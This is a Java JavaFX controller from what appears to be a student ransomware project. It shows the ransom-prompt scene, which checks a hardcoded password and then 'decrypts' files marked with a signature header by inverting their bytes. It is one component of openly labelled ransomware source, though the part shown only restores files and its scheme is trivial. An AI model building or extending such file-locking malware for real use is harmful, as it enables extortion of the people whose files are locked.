package lk.ijse.dep10.app.controller;

import javafx.event.ActionEvent;
import javafx.fxml.FXMLLoader;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.TextField;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;
import javafx.stage.Window;

import java.io.*;
import java.util.ArrayList;
import java.util.Optional;

public class RansomWareScene {
    public TextField txtPassWord;
    public Button btnDecrypt;
    public ArrayList<File> files;
    public String SIGNATURE;


    public void btnDecryptOnAction(ActionEvent actionEvent) throws IOException {
        if (txtPassWord.getText().equals("thusitha")) {
            decrypt();
            Alert information = new Alert(Alert.AlertType.INFORMATION, "Files are Decrypted");
            information.showAndWait();
            Stage stage = (Stage) btnDecrypt.getScene().getWindow();
            stage.close();

            return;
        }
        Alert warning = new Alert(Alert.AlertType.WARNING, "Password is incorrect!");
        warning.showAndWait();
        txtPassWord.requestFocus();

    }

    private void decrypt() throws IOException {

        for (File file : files) {

            if (!findSignature(file)) {
                continue;
            }

            FileInputStream fis = new FileInputStream(file);
            File tempFile = File.createTempFile("int", "out");
            FileOutputStream fos = new FileOutputStream(tempFile);

            fis.read(SIGNATURE.getBytes());

            while (true) {
                byte[] buffer = new byte[1024];
                int read = fis.read(buffer);

                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) ~buffer[i];
                }
                if (read == -1) break;
                fos.write(buffer, 0, read);
            }

            fos.close();
            fis.close();

            file.delete();
            tempFile.renameTo(file);

        }
    }
    private boolean findSignature(File file) throws IOException {
        int length = SIGNATURE.getBytes().length;
        FileInputStream fis = new FileInputStream(file);
        byte[] signature = fis.readNBytes(length);
        return new String(signature).equals(SIGNATURE);


    }

}

